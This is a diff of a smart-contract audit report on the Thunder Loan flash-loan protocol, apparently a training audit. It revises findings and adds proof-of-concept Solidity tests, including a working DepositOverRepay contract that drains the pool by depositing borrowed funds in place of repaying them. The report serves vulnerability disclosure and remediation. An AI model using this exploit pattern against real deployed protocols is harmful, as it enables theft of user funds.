@@ -58,15 +58,12 @@ Assisting Auditors:
 - [Findings](#findings)
   - [High](#high)
     - [\[H-1\] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`](#h-1-mixing-up-variable-location-causes-storage-collisions-in-thunderloans_flashloanfee-and-thunderloans_currentlyflashloaning)
-    - [\[H-2\] Unnecessary `updateExchangeRate` in `deposit` function incorrectly updates `exchangeRate` preventing withdraws and unfairly changing reward distribution](#h-2-unnecessary-updateexchangerate-in-deposit-function-incorrectly-updates-exchangerate-preventing-withdraws-and-unfairly-changing-reward-distribution)
+    - [\[H-2\] Erroneous `ThunderLoan::updateExchange` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate](#h-2-erroneous-thunderloanupdateexchange-in-the-deposit-function-causes-protocol-to-think-it-has-more-fees-than-it-really-does-which-blocks-redemption-and-incorrectly-sets-the-exchange-rate)
     - [\[H-3\] By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol](#h-3-by-calling-a-flashloan-and-then-thunderloandeposit-instead-of-thunderloanrepay-users-can-steal-all-funds-from-the-protocol)
-    - [\[H-4\] getPriceOfOnePoolTokenInWeth uses the TSwap price which doesn't account for decimals, also fee precision is 18 decimals](#h-4-getpriceofonepooltokeninweth-uses-the-tswap-price-which-doesnt-account-for-decimals-also-fee-precision-is-18-decimals)
   - [Medium](#medium)
     - [\[M-1\] Centralization risk for trusted owners](#m-1-centralization-risk-for-trusted-owners)
-      - [Impact:](#impact)
-      - [Contralized owners can brick redemptions by disapproving of a specific token](#contralized-owners-can-brick-redemptions-by-disapproving-of-a-specific-token)
+      - [Centralised owners can brick redemptions by disapproving of a specific token](#centralised-owners-can-brick-redemptions-by-disapproving-of-a-specific-token)
     - [\[M-2\] Using TSwap as price oracle leads to price and oracle manipulation attacks](#m-2-using-tswap-as-price-oracle-leads-to-price-and-oracle-manipulation-attacks)
-    - [\[M-4\] Fee on transfer, rebase, etc](#m-4-fee-on-transfer-rebase-etc)
   - [Low](#low)
     - [\[L-1\] Empty Function Body - Consider commenting why](#l-1-empty-function-body---consider-commenting-why)
     - [\[L-2\] Initializers could be front-run](#l-2-initializers-could-be-front-run)
@@ -149,12 +146,12 @@ This report details the security audit of the Thunder Loan protocol's Solidity s
 
 | Severity | Number of issues found |
 | -------- | ---------------------- |
-| High     | 2                      |
+| High     | 3                      |
 | Medium   | 2                      |
 | Low      | 3                      |
-| Info     | 1                      |
-| Gas      | 2                      |
-| Total    | 10                     |
+| Info     | 4                      |
+| Gas      | 3                      |
+| Total    | 17                     |
 
 # Findings
 
@@ -162,7 +159,9 @@ This report details the security audit of the Thunder Loan protocol's Solidity s
 
 ### [H-1] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`
 
-**Description:** `ThunderLoan.sol` has two variables in the following order:
+**Description:** 
+
+`ThunderLoan.sol` has two variables in the following order:
 
 ```javascript
     uint256 private s_feePrecision;
@@ -179,7 +178,9 @@ However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a 
 Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts. 
 
 
-**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.
+**Impact:** 
+
+After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.
 
 **Proof of Code:**
 
@@ -205,7 +206,9 @@ function testUpgradeBreaks() public {
 
 You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`
 
-**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:
+**Recommended Mitigation:** 
+
+Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:
 
 ```diff
 -    uint256 private s_flashLoanFee; // 0.3% ETH fee
@@ -215,9 +218,11 @@ You can also see the storage layout difference by running `forge inspect Thunder
 +    uint256 public constant FEE_PRECISION = 1e18;
 ```
 
-### [H-2] Unnecessary `updateExchangeRate` in `deposit` function incorrectly updates `exchangeRate` preventing withdraws and unfairly changing reward distribution
+### [H-2] Erroneous `ThunderLoan::updateExchange` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate
 
 **Description:** 
+
+In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between asset tokens and underlying tokens. In a way it's responsible for keeping track of how many fees to give liquidity providers.
 
 ```javascript
     function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
@@ -234,19 +239,151 @@ You can also see the storage layout difference by running `forge inspect Thunder
 
 **Impact:** 
 
+There are several impacts to this bug.
+
+1. The `redeem` function is blocked, because the protocol thinks the amount to be redeemed is more than it's balance.
+2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than they deserve.
+
 **Proof of Concept:**
+
+<details>
+<summary>Proof of Code</summary>
+Place the following into ThunderLoanTest.t.sol:
+
+```javascript
+function testRedeemAfterLoan() public setAllowedToken hasDeposits {
+    uint256 amountToBorrow = AMOUNT * 10;
+    uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
+
+    vm.startPrank(user);
+    thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
+    vm.stopPrank();
+
+    uint256 amountToRedeem = type(uint256).max;
+    vm.startPrank(liquidityProvider);
+    thunderLoan.redeem(tokenA, amountToRedeem);
+}
+```
+</details>
 
 **Recommended Mitigation:** 
 
+Remove the incorrect updateExchangeRate lines from `deposit`
+
+```diff
+function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+    AssetToken assetToken = s_tokenToAssetToken[token];
+    uint256 exchangeRate = assetToken.getExchangeRate();
+    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+    emit Deposit(msg.sender, token, amount);
+    assetToken.mint(msg.sender, mintAmount);
+
+-   uint256 calculatedFee = getCalculatedFee(token, amount);
+-   assetToken.updateExchangeRate(calculatedFee);
+
+    token.safeTransferFrom(msg.sender, address(assetToken), amount);
+}
+```
+
 ### [H-3] By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol
 
-### [H-4] getPriceOfOnePoolTokenInWeth uses the TSwap price which doesn't account for decimals, also fee precision is 18 decimals
+**Description:** 
+
+By calling the deposit function to repay a loan, an attacker can meet the flashloan's repayment check, while being allowed to later redeem their deposited tokens, stealing the loan funds.
+
+**Impact:** 
+
+This exploit drains the liquidity pool for the flash loaned token, breaking internal accounting and stealing all funds.
+
+**Proof of Concept:**
+
+1. Attacker executes a `flashloan`
+2. Borrowed funds are deposited into `ThunderLoan` via a malicious contract's `executeOperation` function
+3. `Flashloan` check passes due to check vs starting AssetToken Balance being equal to the post deposit amount
+4. Attacker is able to call `redeem` on `ThunderLoan` to withdraw the deposited tokens after the flash loan as resolved.
+
+Add the following to ThunderLoanTest.t.sol and run `forge test --mt testUseDepositInsteadOfRepayToStealFunds`
+
+<details>
+<summary>Proof of Code</summary>
+
+```javascript
+function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
+    uint256 amountToBorrow = 50e18;
+    DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+    uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+    vm.startPrank(user);
+    tokenA.mint(address(dor), fee);
+    thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+    dor.redeemMoney();
+    vm.stopPrank();
+
+    assert(tokenA.balanceOf(address(dor)) > fee);
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        s_token.approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
+    }
+}
+```
+</details>
+
+**Recommended Mitigation:** 
+
+ThunderLoan could prevent deposits while an AssetToken is currently flash loaning.
+
+```diff
+function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
++   if (s_currentlyFlashLoaning[token]) {
++       revert ThunderLoan__CurrentlyFlashLoaning();
++   }
+    AssetToken assetToken = s_tokenToAssetToken[token];
+    uint256 exchangeRate = assetToken.getExchangeRate();
+    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+    emit Deposit(msg.sender, token, amount);
+    assetToken.mint(msg.sender, mintAmount);
+
+    uint256 calculatedFee = getCalculatedFee(token, amount);
+    assetToken.updateExchangeRate(calculatedFee);
+
+    token.safeTransferFrom(msg.sender, address(assetToken), amount);
+}
+```
 
 ## Medium 
 
 ### [M-1] Centralization risk for trusted owners
 
-#### Impact:
+**Impact:**
+
 Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.
 
 *Instances (2)*:
@@ -258,14 +395,18 @@ File: src/protocol/ThunderLoan.sol
 261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
 ```
 
-#### Contralized owners can brick redemptions by disapproving of a specific token
+#### Centralised owners can brick redemptions by disapproving of a specific token
 
 
 ### [M-2] Using TSwap as price oracle leads to price and oracle manipulation attacks
 
-**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 
+**Description:** 
 
-**Impact:** Liquidity providers will drastically reduced fees for providing liquidity. 
+The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 
+
+**Impact:** 
+
+Liquidity providers will drastically reduce fees for providing liquidity. 
 
 **Proof of Concept:** 
 
@@ -285,11 +426,9 @@ The following all happens in 1 transaction.
 
 I have created a proof of code located in my `audit-data` folder. It is too large to include here. 
 
-**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 
+**Recommended Mitigation:** 
 
-
-
-### [M-4] Fee on transfer, rebase, etc
+Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 
 
 ## Low
 
@@ -304,6 +443,7 @@ File: src/protocol/ThunderLoan.sol
 ```
 
 ### [L-2] Initializers could be front-run
+
 Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment
 
 *Instances (6)*:
@@ -331,9 +471,13 @@ File: src/protocol/ThunderLoan.sol
 
 ### [L-3] Missing critial event emissions
 
-**Description:** When the `ThunderLoan::s_flashLoanFee` is updated, there is no event emitted. 
+**Description:** 
 
-**Recommended Mitigation:** Emit an event when the `ThunderLoan::s_flashLoanFee` is updated.
+When the `ThunderLoan::s_flashLoanFee` is updated, there is no event emitted. 
+
+**Recommended Mitigation:** 
+
+Emit an event when the `ThunderLoan::s_flashLoanFee` is updated.
 
 ```diff 
 +    event FlashLoanFeeUpdated(uint256 newFee);
@@ -361,6 +505,9 @@ Running tests...
 | src/protocol/OracleUpgradeable.sol | 100.00% (6/6)  | 100.00% (9/9)  | 100.00% (0/0) | 80.00% (4/5)   |
 | src/protocol/ThunderLoan.sol       | 64.52% (40/62) | 68.35% (54/79) | 37.50% (6/16) | 71.43% (10/14) |
 ```
+**Recommended Mitigation:** 
+
+Aim to get test coverage up to over 90% for all files. 
 
 ### [I-2] Not using `__gap[50]` for future storage collision mitigation
 
@@ -368,11 +515,10 @@ Running tests...
 
 ### [I-4] Doesn't follow https://eips.ethereum.org/EIPS/eip-3156
 
-**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files. 
-
 ## Gas
 
 ### [GAS-1] Using bools for storage incurs overhead
+
 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).
 
 *Instances (1)*:
@@ -384,6 +530,7 @@ File: src/protocol/ThunderLoan.sol
 ```
 
 ### [GAS-2] Using `private` rather than `public` for constants, saves gas
+
 If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table
 
 *Instances (3)*:
